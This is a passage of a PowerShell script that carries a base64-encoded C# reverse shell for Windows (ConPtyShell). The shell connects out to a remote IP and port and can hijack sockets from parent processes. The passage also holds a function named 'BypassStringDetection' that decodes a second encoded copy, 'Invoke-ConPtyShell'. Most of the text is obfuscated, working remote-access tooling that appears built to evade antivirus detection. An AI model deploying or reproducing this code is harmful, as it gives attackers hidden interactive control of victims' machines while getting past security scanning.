iBzaGVsbFNvY2tldCA9IEludFB0ci5aZXJvOwogICAgICAgIEludFB0ciBJbnB1dFBpcGVSZWFkID0gSW50UHRyLlplcm87CiAgICAgICAgSW50UHRyIElucHV0UGlwZVdyaXRlID0gSW50UHRyLlplcm87CiAgICAgICAgSW50UHRyIE91dHB1dFBpcGVSZWFkID0gSW50UHRyLlplcm87CiAgICAgICAgSW50UHRyIE91dHB1dFBpcGVXcml0ZSA9IEludFB0ci5aZXJvOwogICAgICAgIEludFB0ciBoYW5kbGVQc2V1ZG9Db25zb2xlID0gSW50UHRyLlplcm87CiAgICAgICAgSW50UHRyIG9sZFN0ZEluID0gSW50UHRyLlplcm87CiAgICAgICAgSW50UHRyIG9sZFN0ZE91dCA9IEludFB0ci5aZXJvOwogICAgICAgIEludFB0ciBvbGRTdGRFcnIgPSBJbnRQdHIuWmVybzsKICAgICAgICBib29sIG5ld0NvbnNvbGVBbGxvY2F0ZWQgPSBmYWxzZTsKICAgICAgICBib29sIHBhcmVudFNvY2tldEluaGVyaXRlZCA9IGZhbHNlOwogICAgICAgIGJvb2wgZ3JhbmRQYXJlbnRTb2NrZXRJbmhlcml0ZWQgPSBmYWxzZTsKICAgICAgICBib29sIGNvbnB0eUNvbXBhdGlibGUgPSBmYWxzZTsKICAgICAgICBib29sIElzU29ja2V0T3ZlcmxhcHBlZCA9IHRydWU7CiAgICAgICAgc3RyaW5nIG91dHB1dCA9ICIiOwogICAgICAgIFByb2Nlc3MgY3VycmVudFByb2Nlc3MgPSBudWxsOwogICAgICAgIFByb2Nlc3MgcGFyZW50UHJvY2VzcyA9IG51bGw7CiAgICAgICAgUHJvY2VzcyBncmFuZFBhcmVudFByb2Nlc3MgPSBudWxsOwogICAgICAgIGlmIChHZXRQcm9jQWRkcmVzcyhHZXRNb2R1bGVIYW5kbGUoImtlcm5lbDMyIiksICJDcmVhdGVQc2V1ZG9Db25zb2xlIikgIT0gSW50UHRyLlplcm8pCiAgICAgICAgICAgIGNvbnB0eUNvbXBhdGlibGUgPSB0cnVlOwogICAgICAgIFBST0NFU1NfSU5GT1JNQVRJT04gY2hpbGRQcm9jZXNzSW5mbyA9IG5ldyBQUk9DRVNTX0lORk9STUFUSU9OKCk7CiAgICAgICAgQ3JlYXRlUGlwZXMocmVmIElucHV0UGlwZVJlYWQsIHJlZiBJbnB1dFBpcGVXcml0ZSwgcmVmIE91dHB1dFBpcGVSZWFkLCByZWYgT3V0cHV0UGlwZVdyaXRlKTsKICAgICAgICAvLyBjb21tZW50IHRoZSBiZWxvdyBmdW5jdGlvbiB0byBkZWJ1ZyBlcnJvcnMKICAgICAgICBJbml0Q29uc29sZShyZWYgb2xkU3RkSW4sIHJlZiBvbGRTdGRPdXQsIHJlZiBvbGRTdGRFcnIpOwogICAgICAgIC8vIGluaXQgd3Nhc3RhcnR1cCBzdHVmZiBmb3IgdGhpcyB0aHJlYWQKICAgICAgICBJbml0V1NBVGhyZWFkKCk7CiAgICAgICAgaWYgKGNvbnB0eUNvbXBhdGlibGUpCiAgICAgICAgewogICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiXHJcbkNyZWF0ZVBzZXVkb0NvbnNvbGUgZnVuY3Rpb24gZm91bmQhIFNwYXduaW5nIGEgZnVsbHkgaW50ZXJhY3RpdmUgc2hlbGxcclxuIik7CiAgICAgICAgICAgIGlmICh1cGdyYWRlU2hlbGwpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIExpc3Q8SW50UHRyPiBzb2NrZXRzSGFuZGxlcyA9IG5ldyBMaXN0PEludFB0cj4oKTsKICAgICAgICAgICAgICAgIGN1cnJlbnRQcm9jZXNzID0gUHJvY2Vzcy5HZXRDdXJyZW50UHJvY2VzcygpOwogICAgICAgICAgICAgICAgcGFyZW50UHJvY2VzcyA9IFBhcmVudFByb2Nlc3NVdGlsaXRpZXMuR2V0UGFyZW50UHJvY2VzcyhjdXJyZW50UHJvY2Vzcy5IYW5kbGUpOwogICAgICAgICAgICAgICAgaWYgKHBhcmVudFByb2Nlc3MgIT0gbnVsbCkgZ3JhbmRQYXJlbnRQcm9jZXNzID0gUGFyZW50UHJvY2Vzc1V0aWxpdGllcy5HZXRQYXJlbnRQcm9jZXNzKHBhcmVudFByb2Nlc3MuSGFuZGxlKTsKICAgICAgICAgICAgICAgIC8vIHRyeSB0byBkdXBsaWNhdGUgdGhlIHNvY2tldCBmb3IgdGhlIGN1cnJlbnQgcHJvY2VzcwogICAgICAgICAgICAgICAgc2hlbGxTb2NrZXQgPSBTb2NrZXRIaWphY2tpbmcuRHVwbGljYXRlVGFyZ2V0UHJvY2Vzc1NvY2tldChjdXJyZW50UHJvY2VzcywgcmVmIElzU29ja2V0T3ZlcmxhcHBlZCk7CiAgICAgICAgICAgICAgICBpZiAoc2hlbGxTb2NrZXQgPT0gSW50UHRyLlplcm8gJiYgcGFyZW50UHJvY2VzcyAhPSBudWxsKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIC8vIGlmIG5vIHNvY2tldHMgYXJlIGZvdW5kIGluIHRoZSBjdXJyZW50IHByb2Nlc3Mgd2UgdHJ5IHRvIGhpamFjayBvdXIgY3VycmVudCBwYXJlbnQgcHJvY2VzcyBzb2NrZXQKICAgICAgICAgICAgICAgICAgICBzaGVsbFNvY2tldCA9IFNvY2tldEhpamFja2luZy5EdXBsaWNhdGVUYXJnZXRQcm9jZXNzU29ja2V0KHBhcmVudFByb2Nlc3MsIHJlZiBJc1NvY2tldE92ZXJsYXBwZWQpOwogICAgICAgICAgICAgICAgICAgIGlmIChzaGVsbFNvY2tldCA9PSBJbnRQdHIuWmVybyAmJiBncmFuZFBhcmVudFByb2Nlc3MgIT0gbnVsbCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIC8vIGRhbW4sIGV2ZW4gdGhlIHBhcmVudCBwcm9jZXNzIGhhcyBubyB1c2FibGUgc29ja2V0cywgbGV0J3MgdHJ5IGEgbGFzdCBkZXNwZXJhdGUgYXR0ZW1wdCBpbiB0aGUgZ3JhbmRwYXJlbnQgcHJvY2VzcwogICAgICAgICAgICAgICAgICAgICAgICBzaGVsbFNvY2tldCA9IFNvY2tldEhpamFja2luZy5EdXBsaWNhdGVUYXJnZXRQcm9jZXNzU29ja2V0KGdyYW5kUGFyZW50UHJvY2VzcywgcmVmIElzU29ja2V0T3ZlcmxhcHBlZCk7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChzaGVsbFNvY2tldCA9PSBJbnRQdHIuWmVybykKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IENvblB0eVNoZWxsRXhjZXB0aW9uKCJObyBcXERldmljZVxcQWZkIG9iamVjdHMgZm91bmQuIFNvY2tldCBkdXBsaWNhdGlvbiBmYWlsZWQuIik7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBncmFuZFBhcmVudFNvY2tldEluaGVyaXRlZCA9IHRydWU7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgLy8gZ290Y2hhIGEgdXNhYmxlIHNvY2tldCBmcm9tIHRoZSBwYXJlbnQgcHJvY2VzcywgbGV0J3Mgc2VlIGlmIHRoZSBncmFuZFBhcmVudCBhbHNvIHVzZSB0aGUgc29ja2V0CiAgICAgICAgICAgICAgICAgICAgICAgIHBhcmVudFNvY2tldEluaGVyaXRlZCA9IHRydWU7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChncmFuZFBhcmVudFByb2Nlc3MgIT0gbnVsbCkgZ3JhbmRQYXJlbnRTb2NrZXRJbmhlcml0ZWQgPSBTb2NrZXRIaWphY2tpbmcuSXNTb2NrZXRJbmhlcml0ZWQoc2hlbGxTb2NrZXQsIGdyYW5kUGFyZW50UHJvY2Vzcyk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIC8vIHRoZSBjdXJyZW50IHByb2Nlc3MgZ290IGEgdXNhYmxlIHNvY2tldCwgbGV0J3Mgc2VlIGlmIHRoZSBwYXJlbnRzIHVzZSB0aGUgc29ja2V0CiAgICAgICAgICAgICAgICAgICAgaWYgKHBhcmVudFByb2Nlc3MgIT0gbnVsbCkgcGFyZW50U29ja2V0SW5oZXJpdGVkID0gU29ja2V0SGlqYWNraW5nLklzU29ja2V0SW5oZXJpdGVkKHNoZWxsU29ja2V0LCBwYXJlbnRQcm9jZXNzKTsKICAgICAgICAgICAgICAgICAgICBpZiAoZ3JhbmRQYXJlbnRQcm9jZXNzICE9IG51bGwpIGdyYW5kUGFyZW50U29ja2V0SW5oZXJpdGVkID0gU29ja2V0SGlqYWNraW5nLklzU29ja2V0SW5oZXJpdGVkKHNoZWxsU29ja2V0LCBncmFuZFBhcmVudFByb2Nlc3MpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgc2hlbGxTb2NrZXQgPSBjb25uZWN0UmVtb3RlKHJlbW90ZUlwLCByZW1vdGVQb3J0KTsKICAgICAgICAgICAgICAgIGlmIChzaGVsbFNvY2tldCA9PSBJbnRQdHIuWmVybykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBvdXRwdXQgKz0gc3RyaW5nLkZvcm1hdCgiezB9Q291bGQgbm90IGNvbm5lY3QgdG8gaXAgezF9IG9uIHBvcnQgezJ9IiwgZXJyb3JTdHJpbmcsIHJlbW90ZUlwLCByZW1vdGVQb3J0LlRvU3RyaW5nKCkpOwogICAgICAgICAgICAgICAgICAgIHJldHVybiBvdXRwdXQ7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBUcnlQYXJzZVJvd3NDb2xzRnJvbVNvY2tldChzaGVsbFNvY2tldCwgcmVmIHJvd3MsIHJlZiBjb2xzKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoR2V0Q29uc29sZVdpbmRvdygpID09IEludFB0ci5aZXJvKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBBbGxvY0NvbnNvbGUoKTsKICAgICAgICAgICAgICAgIFNob3dXaW5kb3coR2V0Q29uc29sZVdpbmRvdygpLCBTV19ISURFKTsKICAgICAgICAgICAgICAgIG5ld0NvbnNvbGVBbGxvY2F0ZWQgPSB0cnVlOwogICAgICAgICAgICB9CiAgICAgICAgICAgIC8vIGRlYnVnIGNvZGUgZm9yIGNoZWNraW5nIGhhbmRsZSBkdXBsaWNhdGlvbgogICAgICAgICAgICAvLyBDb25zb2xlLldyaXRlTGluZSgiZGVidWc6IENyZWF0aW5nIHBzZXVkbyBjb25zb2xlLi4uIik7CiAgICAgICAgICAgIC8vIFRocmVhZC5TbGVlcCgxODAwMDApOwogICAgICAgICAgICAvLyByZXR1cm4gIiI7CiAgICAgICAgICAgIGludCBwc2V1ZG9Db25zb2xlQ3JlYXRpb25SZXN1bHQgPSBDcmVhdGVQc2V1ZG9Db25zb2xlV2l0aFBpcGVzKHJlZiBoYW5kbGVQc2V1ZG9Db25zb2xlLCByZWYgSW5wdXRQaXBlUmVhZCwgcmVmIE91dHB1dFBpcGVXcml0ZSwgcm93cywgY29scyk7CiAgICAgICAgICAgIGlmIChwc2V1ZG9Db25zb2xlQ3JlYXRpb25SZXN1bHQgIT0gMCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgb3V0cHV0ICs9IHN0cmluZy5Gb3JtYXQoInswfUNvdWxkIG5vdCBjcmVhdGUgcHN1ZWRvIGNvbnNvbGUuIEVycm9yIENvZGUgezF9IiwgZXJyb3JTdHJpbmcsIHBzZXVkb0NvbnNvbGVDcmVhdGlvblJlc3VsdC5Ub1N0cmluZygpKTsKICAgICAgICAgICAgICAgIHJldHVybiBvdXRwdXQ7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2hpbGRQcm9jZXNzSW5mbyA9IENyZWF0ZUNoaWxkUHJvY2Vzc1dpdGhQc2V1ZG9Db25zb2xlKGhhbmRsZVBzZXVkb0NvbnNvbGUsIGNvbW1hbmRMaW5lKTsKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgaWYgKHVwZ3JhZGVTaGVsbCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgb3V0cHV0ICs9IHN0cmluZy5Gb3JtYXQoIkNvdWxkIG5vdCB1cGdyYWRlIHNoZWxsIHRvIGZ1bGx5IGludGVyYWN0aXZlIGJlY2F1c2UgQ29uUFRZIGlzIG5vdCBjb21wYXRpYmxlIG9uIHRoaXMgc3lzdGVtIik7CiAgICAgICAgICAgICAgICByZXR1cm4gb3V0cHV0OwogICAgICAgICAgICB9CiAgICAgICAgICAgIHNoZWxsU29ja2V0ID0gY29ubmVjdFJlbW90ZShyZW1vdGVJcCwgcmVtb3RlUG9ydCk7CiAgICAgICAgICAgIGlmIChzaGVsbFNvY2tldCA9PSBJbnRQdHIuWmVybykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgb3V0cHV0ICs9IHN0cmluZy5Gb3JtYXQoInswfUNvdWxkIG5vdCBjb25uZWN0IHRvIGlwIHsxfSBvbiBwb3J0IHsyfSIsIGVycm9yU3RyaW5nLCByZW1vdGVJcCwgcmVtb3RlUG9ydC5Ub1N0cmluZygpKTsKICAgICAgICAgICAgICAgIHJldHVybiBvdXRwdXQ7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIlxyXG5DcmVhdGVQc2V1ZG9Db25zb2xlIGZ1bmN0aW9uIG5vdCBmb3VuZCEgU3Bhd25pbmcgYSBuZXRjYXQtbGlrZSBpbnRlcmFjdGl2ZSBzaGVsbC4uLlxyXG4iKTsKICAgICAgICAgICAgU1RBUlRVUElORk8gc0luZm8gPSBuZXcgU1RBUlRVUElORk8oKTsKICAgICAgICAgICAgc0luZm8uY2IgPSBNYXJzaGFsLlNpemVPZihzSW5mbyk7CiAgICAgICAgICAgIHNJbmZvLmR3RmxhZ3MgfD0gKEludDMyKVNUQVJURl9VU0VTVERIQU5ETEVTOwogICAgICAgICAgICBzSW5mby5oU3RkSW5wdXQgPSBJbnB1dFBpcGVSZWFkOwogICAgICAgICAgICBzSW5mby5oU3RkT3V0cHV0ID0gT3V0cHV0UGlwZVdyaXRlOwogICAgICAgICAgICBzSW5mby5oU3RkRXJyb3IgPSBPdXRwdXRQaXBlV3JpdGU7CiAgICAgICAgICAgIENyZWF0ZVByb2Nlc3MobnVsbCwgY29tbWFuZExpbmUsIEludFB0ci5aZXJvLCBJbnRQdHIuWmVybywgdHJ1ZSwgMCwgSW50UHRyLlplcm8sIG51bGwsIHJlZiBzSW5mbywgb3V0IGNoaWxkUHJvY2Vzc0luZm8pOwogICAgICAgIH0KICAgICAgICAvLyBOb3RlOiBXZSBjYW4gY2xvc2UgdGhlIGhhbmRsZXMgdG8gdGhlIFBUWS1lbmQgb2YgdGhlIHBpcGVzIGhlcmUKICAgICAgICAvLyBiZWNhdXNlIHRoZSBoYW5kbGVzIGFyZSBkdXAnZWQgaW50byB0aGUgQ29uSG9zdCBhbmQgd2lsbCBiZSByZWxlYXNlZAogICAgICAgIC8vIHdoZW4gdGhlIENvblBUWSBpcyBkZXN0cm95ZWQuCiAgICAgICAgaWYgKElucHV0UGlwZVJlYWQgIT0gSW50UHRyLlplcm8pIENsb3NlSGFuZGxlKElucHV0UGlwZVJlYWQpOwogICAgICAgIGlmIChPdXRwdXRQaXBlV3JpdGUgIT0gSW50UHRyLlplcm8pIENsb3NlSGFuZGxlKE91dHB1dFBpcGVXcml0ZSk7CiAgICAgICAgaWYgKHVwZ3JhZGVTaGVsbCkgewogICAgICAgICAgICAvLyB3ZSBuZWVkIHRvIHN1c3BlbmQgb3RoZXIgcHJvY2Vzc2VzIHRoYXQgY2FuIGludGVyYWN0IHdpdGggdGhlIGR1cGxpY2F0ZWQgc29ja2V0cyBpZiBhbnkuIFRoaXMgd2lsbCBlbnN1cmUgc3RkaW4sIHN0ZG91dCBhbmQgc3RkZXJyIGlzIHJlYWQvd3JpdGUgb25seSBieSBvdXIgY29ucHR5IHByb2Nlc3MKICAgICAgICAgICAgaWYgKHBhcmVudFNvY2tldEluaGVyaXRlZCkgTnRTdXNwZW5kUHJvY2VzcyhwYXJlbnRQcm9jZXNzLkhhbmRsZSk7CiAgICAgICAgICAgIGlmIChncmFuZFBhcmVudFNvY2tldEluaGVyaXRlZCkgTnRTdXNwZW5kUHJvY2VzcyhncmFuZFBhcmVudFByb2Nlc3MuSGFuZGxlKTsKICAgICAgICAgICAgaWYgKCFJc1NvY2tldE92ZXJsYXBwZWQpIFNvY2tldEhpamFja2luZy5TZXRTb2NrZXRCbG9ja2luZ01vZGUoc2hlbGxTb2NrZXQsIDEpOwogICAgICAgIH0KICAgICAgICAvL1RocmVhZHMgaGF2ZSBiZXR0ZXIgcGVyZm9ybWFuY2UgdGhhbiBUYXNrcwogICAgICAgIFRocmVhZCB0aFRocmVhZFJlYWRQaXBlV3JpdGVTb2NrZXQgPSBTdGFydFRocmVhZFJlYWRQaXBlV3JpdGVTb2NrZXQoT3V0cHV0UGlwZVJlYWQsIHNoZWxsU29ja2V0LCBJc1NvY2tldE92ZXJsYXBwZWQpOwogICAgICAgIFRocmVhZCB0aFJlYWRTb2NrZXRXcml0ZVBpcGUgPSBTdGFydFRocmVhZFJlYWRTb2NrZXRXcml0ZVBpcGUoSW5wdXRQaXBlV3JpdGUsIHNoZWxsU29ja2V0LCBjaGlsZFByb2Nlc3NJbmZvLmhQcm9jZXNzLCBJc1NvY2tldE92ZXJsYXBwZWQpOwogICAgICAgIC8vIHdhaXQgZm9yIHRoZSBjaGlsZCBwcm9jZXNzIHVudGlsIGV4aXQKICAgICAgICBXYWl0Rm9yU2luZ2xlT2JqZWN0KGNoaWxkUHJvY2Vzc0luZm8uaFByb2Nlc3MsIElORklOSVRFKTsKICAgICAgICAvL2NsZWFudXAgZXZlcnl0aGluZwogICAgICAgIHRoVGhyZWFkUmVhZFBpcGVXcml0ZVNvY2tldC5BYm9ydCgpOwogICAgICAgIHRoUmVhZFNvY2tldFdyaXRlUGlwZS5BYm9ydCgpOwogICAgICAgIGlmICh1cGdyYWRlU2hlbGwpCiAgICAgICAgewogICAgICAgICAgICBpZiAoIUlzU29ja2V0T3ZlcmxhcHBlZCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgLy8gY2FuY2VsbGluZyB0aGUgZXZlbnQgc2VsZWN0aW9uIGZvciB0aGUgc29ja2V0CiAgICAgICAgICAgICAgICBXU0FFdmVudFNlbGVjdChzaGVsbFNvY2tldCwgSW50UHRyLlplcm8sIDApOwogICAgICAgICAgICAgICAgU29ja2V0SGlqYWNraW5nLlNldFNvY2tldEJsb2NraW5nTW9kZShzaGVsbFNvY2tldCwgMCk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKHBhcmVudFNvY2tldEluaGVyaXRlZCkgTnRSZXN1bWVQcm9jZXNzKHBhcmVudFByb2Nlc3MuSGFuZGxlKTsKICAgICAgICAgICAgaWYgKGdyYW5kUGFyZW50U29ja2V0SW5oZXJpdGVkKSBOdFJlc3VtZVByb2Nlc3MoZ3JhbmRQYXJlbnRQcm9jZXNzLkhhbmRsZSk7CiAgICAgICAgfQogICAgICAgIGNsb3Nlc29ja2V0KHNoZWxsU29ja2V0KTsKICAgICAgICBSZXN0b3JlU3RkSGFuZGxlcyhvbGRTdGRJbiwgb2xkU3RkT3V0LCBvbGRTdGRFcnIpOwogICAgICAgIGlmIChuZXdDb25zb2xlQWxsb2NhdGVkKQogICAgICAgICAgICBGcmVlQ29uc29sZSgpOwogICAgICAgIENsb3NlSGFuZGxlKGNoaWxkUHJvY2Vzc0luZm8uaFRocmVhZCk7CiAgICAgICAgQ2xvc2VIYW5kbGUoY2hpbGRQcm9jZXNzSW5mby5oUHJvY2Vzcyk7CiAgICAgICAgaWYgKGhhbmRsZVBzZXVkb0NvbnNvbGUgIT0gSW50UHRyLlplcm8pIENsb3NlUHNldWRvQ29uc29sZShoYW5kbGVQc2V1ZG9Db25zb2xlKTsKICAgICAgICBpZiAoSW5wdXRQaXBlV3JpdGUgIT0gSW50UHRyLlplcm8pIENsb3NlSGFuZGxlKElucHV0UGlwZVdyaXRlKTsKICAgICAgICBpZiAoT3V0cHV0UGlwZVJlYWQgIT0gSW50UHRyLlplcm8pIENsb3NlSGFuZGxlKE91dHB1dFBpcGVSZWFkKTsKICAgICAgICBvdXRwdXQgKz0gIkNvblB0eVNoZWxsIGtpbmRseSBleGl0ZWQuXHJcbiI7CiAgICAgICAgcmV0dXJuIG91dHB1dDsKICAgIH0KfQoKcHVibGljIHN0YXRpYyBjbGFzcyBDb25QdHlTaGVsbE1haW5DbGFzcwp7CiAgICBwcml2YXRlIHN0YXRpYyBzdHJpbmcgaGVscCA9IEAiIjsKCiAgICBwcml2YXRlIHN0YXRpYyBib29sIEhlbHBSZXF1aXJlZChzdHJpbmcgcGFyYW0pCiAgICB7CiAgICAgICAgcmV0dXJuIHBhcmFtID09ICItaCIgfHwgcGFyYW0gPT0gIi0taGVscCIgfHwgcGFyYW0gPT0gIi8/IjsKICAgIH0KCiAgICBwcml2YXRlIHN0YXRpYyB2b2lkIENoZWNrQXJncyhzdHJpbmdbXSBhcmd1bWVudHMpCiAgICB7CiAgICAgICAgaWYgKGFyZ3VtZW50cy5MZW5ndGggPCAyKQogICAgICAgICAgICB0aHJvdyBuZXcgQ29uUHR5U2hlbGxFeGNlcHRpb24oIlxyXG5Db25QdHlTaGVsbDogTm90IGVub3VnaCBhcmd1bWVudHMuIDIgQXJndW1lbnRzIHJlcXVpcmVkLiBVc2UgLS1oZWxwIGZvciBhZGRpdGlvbmFsIGhlbHAuXHJcbiIpOwogICAgfQoKICAgIHByaXZhdGUgc3RhdGljIHZvaWQgRGlzcGxheUhlbHAoKQogICAgewogICAgICAgIENvbnNvbGUuT3V0LldyaXRlKGhlbHApOwogICAgfQoKICAgIHByaXZhdGUgc3RhdGljIHN0cmluZyBDaGVja1JlbW90ZUlwQXJnKHN0cmluZyBpcFN0cmluZykKICAgIHsKICAgICAgICBJUEFkZHJlc3MgYWRkcmVzczsKICAgICAgICBpZiAoIUlQQWRkcmVzcy5UcnlQYXJzZShpcFN0cmluZywgb3V0IGFkZHJlc3MpKQogICAgICAgICAgICB0aHJvdyBuZXcgQ29uUHR5U2hlbGxFeGNlcHRpb24oIlxyXG5Db25QdHlTaGVsbDogSW52YWxpZCByZW1vdGVJcCB2YWx1ZSIgKyBpcFN0cmluZyk7CiAgICAgICAgcmV0dXJuIGlwU3RyaW5nOwogICAgfQoKICAgIHByaXZhdGUgc3RhdGljIGludCBDaGVja0ludChzdHJpbmcgYXJnKQogICAgewogICAgICAgIGludCByZXQgPSAwOwogICAgICAgIGlmICghSW50MzIuVHJ5UGFyc2UoYXJnLCBvdXQgcmV0KSkKICAgICAgICAgICAgdGhyb3cgbmV3IENvblB0eVNoZWxsRXhjZXB0aW9uKCJcclxuQ29uUHR5U2hlbGw6IEludmFsaWQgaW50ZWdlciB2YWx1ZSAiICsgYXJnKTsKICAgICAgICByZXR1cm4gcmV0OwogICAgfQoKICAgIHByaXZhdGUgc3RhdGljIHVpbnQgUGFyc2VSb3dzKHN0cmluZ1tdIGFyZ3VtZW50cykKICAgIHsKICAgICAgICB1aW50IHJvd3MgPSAyNDsKICAgICAgICBpZiAoYXJndW1lbnRzLkxlbmd0aCA+IDIpCiAgICAgICAgICAgIHJvd3MgPSAodWludClDaGVja0ludChhcmd1bWVudHNbMl0pOwogICAgICAgIHJldHVybiByb3dzOwogICAgfQoKICAgIHByaXZhdGUgc3RhdGljIHVpbnQgUGFyc2VDb2xzKHN0cmluZ1tdIGFyZ3VtZW50cykKICAgIHsKICAgICAgICB1aW50IGNvbHMgPSA4MDsKICAgICAgICBpZiAoYXJndW1lbnRzLkxlbmd0aCA+IDMpCiAgICAgICAgICAgIGNvbHMgPSAodWludClDaGVja0ludChhcmd1bWVudHNbM10pOwogICAgICAgIHJldHVybiBjb2xzOwogICAgfQoKICAgIHByaXZhdGUgc3RhdGljIHN0cmluZyBQYXJzZUNvbW1hbmRMaW5lKHN0cmluZ1tdIGFyZ3VtZW50cykKICAgIHsKICAgICAgICBzdHJpbmcgY29tbWFuZExpbmUgPSAicG93ZXJzaGVsbC5leGUiOwogICAgICAgIGlmIChhcmd1bWVudHMuTGVuZ3RoID4gNCkKICAgICAgICAgICAgY29tbWFuZExpbmUgPSBhcmd1bWVudHNbNF07CiAgICAgICAgcmV0dXJuIGNvbW1hbmRMaW5lOwogICAgfQoKICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIENvblB0eVNoZWxsTWFpbihzdHJpbmdbXSBhcmdzKQogICAgewogICAgICAgIHN0cmluZyBvdXRwdXQgPSAiIjsKICAgICAgICBpZiAoYXJncy5MZW5ndGggPT0gMSAmJiBIZWxwUmVxdWlyZWQoYXJnc1swXSkpCiAgICAgICAgewogICAgICAgICAgICBEaXNwbGF5SGVscCgpOwogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICBzdHJpbmcgcmVtb3RlSXAgPSAiIjsKICAgICAgICAgICAgaW50IHJlbW90ZVBvcnQgPSAwOwogICAgICAgICAgICBib29sIHVwZ3JhZGVTaGVsbCA9IGZhbHNlOwogICAgICAgICAgICB0cnkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgQ2hlY2tBcmdzKGFyZ3MpOwogICAgICAgICAgICAgICAgaWYgKGFyZ3NbMF0uQ29udGFpbnMoInVwZ3JhZGUiKSkKICAgICAgICAgICAgICAgICAgICB1cGdyYWRlU2hlbGwgPSB0cnVlOwogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIHJlbW90ZUlwID0gQ2hlY2tSZW1vdGVJcEFyZyhhcmdzWzBdKTsKICAgICAgICAgICAgICAgICAgICByZW1vdGVQb3J0ID0gQ2hlY2tJbnQoYXJnc1sxXSk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB1aW50IHJvd3MgPSBQYXJzZVJvd3MoYXJncyk7CiAgICAgICAgICAgICAgICB1aW50IGNvbHMgPSBQYXJzZUNvbHMoYXJncyk7CiAgICAgICAgICAgICAgICBzdHJpbmcgY29tbWFuZExpbmUgPSBQYXJzZUNvbW1hbmRMaW5lKGFyZ3MpOwogICAgICAgICAgICAgICAgb3V0cHV0ID0gQ29uUHR5U2hlbGwuU3Bhd25Db25QdHlTaGVsbChyZW1vdGVJcCwgcmVtb3RlUG9ydCwgcm93cywgY29scywgY29tbWFuZExpbmUsIHVwZ3JhZGVTaGVsbCk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggKEV4Y2VwdGlvbiBlKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiXG4iICsgZS5Ub1N0cmluZygpICsgIlxuIik7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgcmV0dXJuIG91dHB1dDsKICAgIH0KfQoKCmNsYXNzIE1haW5DbGFzcwp7CiAgICBzdGF0aWMgdm9pZCBNYWluKHN0cmluZ1tdIGFyZ3MpCiAgICB7CiAgICAgICAgQ29uc29sZS5PdXQuV3JpdGUoQ29uUHR5U2hlbGxNYWluQ2xhc3MuQ29uUHR5U2hlbGxNYWluKGFyZ3MpKTsKICAgIH0KfQoKIkA7

Function BypassStringDetection {

    # Decode the base64 string
    $DecodedString = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gSW52b2tlLUNvblB0eVNoZWxsCnsgICAKICAgIDwjCiAgICAgICAgLlNZTk9QU0lTCiAgICAgICAgICAgIENvblB0eVNoZWxsIC0gRnVsbHkgSW50ZXJhY3RpdmUgUmV2ZXJzZSBTaGVsbCBmb3IgV2luZG93cyAKICAgICAgICAgICAgQXV0aG9yOiBzcGxpbnRlcl9jb2RlCiAgICAgICAgICAgIExpY2Vuc2U6IE1JVAogICAgICAgICAgICBTb3VyY2U6IGh0dHBzOi8vZ2l0aHViLmNvbS9hbnRvbmlvQ29jby9Db25QdHlTaGVsbAogICAgICAgIAogICAgICAgIC5ERVNDUklQVElPTgogICAgICAgICAgICBDb25QdHlTaGVsbCAtIEZ1bGx5IGludGVyYWN0aXZlIHJldmVyc2Ugc2hlbGwgZm9yIFdpbmRvd3MKICAgICAgICAgICAgCiAgICAgICAgICAgIFByb3Blcmx5IHNldCB0aGUgcm93cyBhbmQgY29scyB2YWx1ZXMuIFlvdSBjYW4gcmV0cmlldmUgaXQgZnJvbQogICAgICAgICAgICB5b3VyIHRlcm1pbmFsIHdpdGggdGhlIGNvbW1hbmQgInN0dHkgc2l6ZSIuCiAgICAgICAgICAgIAogICAgICAgICAgICBZb3UgY2FuIGF2b2lkIHRvIHNldCByb3dzIGFuZCBjb2xzIHZhbHVlcyBpZiB5b3UgcnVuIHlvdXIgbGlzdGVuZXIKICAgICAgICAgICAgd2l0aCB0aGUgZm9sbG93aW5nI